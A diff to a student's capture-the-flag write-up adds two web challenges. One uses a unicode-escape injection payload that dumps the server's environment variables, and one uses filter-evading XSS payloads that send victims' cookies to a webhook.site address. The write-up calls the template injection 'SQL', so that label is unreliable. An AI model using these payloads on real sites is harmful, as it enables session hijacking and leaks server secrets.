@@ -1,4 +1,4 @@
-<# 1. databaseincursionv2
+# 1. databaseincursionv2
 
 ## Solution:
 ```
@@ -76,5 +76,61 @@ nite{are_you_feeling_the_heat_now:)}
 
 ## Resources:
 - Chatgpt carried me throughout the whole thing.
+
+# 4. sweethaven
+- The website will be accessible at http://localhost:1234
+- After solving locally, access the challenge server at http://sweethaven.nitephase.live:57889
+
+## Solution:
+- Since every kind of these challenges we have done it first locally and then connected to remote server i knew what had to be done.
+- Kind of understood that sql needs to be used.
+- The app.py has .decode("unicode_escape") which blocks injections wih $
+- So i tried \N{DOLLAR SIGN}{7*7} which gave me 49 meaning SQL is nw working.
+
+
+```
+\N{DOLLAR SIGN}{cycler._init.globals_.os.environ}
+```
+
+- When used in remote server gave me the flag.
+
+## Flag:
+```
+nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
+```
+
+## Concepts learnt:
+- Injection using Unicode char
+
+## Resources:
+- https://hackviser.com/tactics/pentesting/web/sql-injection
+
+# 5. Why is it not called css
+- The website will be accessible at http://localhost:56743
+- After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743
+
+## Solution:
+- In app.py I explored what each command is doing, and figured out that three parts exists XSS1,XSS2,XSS3
+- I figured out that webhook.site is used to capture the cookies captured by the bot when injections are passed through
+- After pasting the later part of the cookie in the url of the website it loaded XSS2 
+- And then after getting cookie of XSS3 i put it in the url and got XSS3 web page.
+
+```
+<script>window.location='h< >/?cookie='+document.cookie</script>
+<scrscriptipt>window.location='https://webhook.site/9f3b27c4-1a8d-49e6-9342-52be7d8ce7aa?cookie='+document.cookie</scrscriptipt>
+<body onload="window.location='https://webhook.site/9f3b27c4-1a8d-49e6-9342-52be7d8ce7aa?c='+window['doc'+'ument']['coo'+'kie']">
+```
+
+- This is how i got the flag.   
+
+## Flag:
+```
+nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
+```
+## Concepts learned:
+- XSS scrypting
+
+## Resources:
+- Chatgpt
 
     
